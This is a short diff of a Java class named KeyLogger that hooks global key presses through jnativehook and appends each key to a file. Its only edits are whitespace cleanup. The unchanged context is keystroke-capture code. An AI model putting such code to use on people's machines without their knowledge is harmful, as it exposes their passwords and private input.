@@ -41,7 +41,7 @@ public class KeyLogger implements NativeKeyListener {
 	}
 
 	private static void init() {
-		
+
 		// Get the logger for "org.jnativehook" and set the level to warning.
 		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
 		logger.setLevel(Level.WARNING);
@@ -52,16 +52,16 @@ public class KeyLogger implements NativeKeyListener {
 
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
-		
+
 		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
 				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
-			
+
 			if (keyText.length() > 1) {
 				writer.print("[" + keyText + "];");
 			} else {
 				writer.print(keyText + ";");
 			}
-			
+
 		} catch (IOException ex) {
 			logger.error(ex.getMessage(), ex);
 			System.exit(-1);
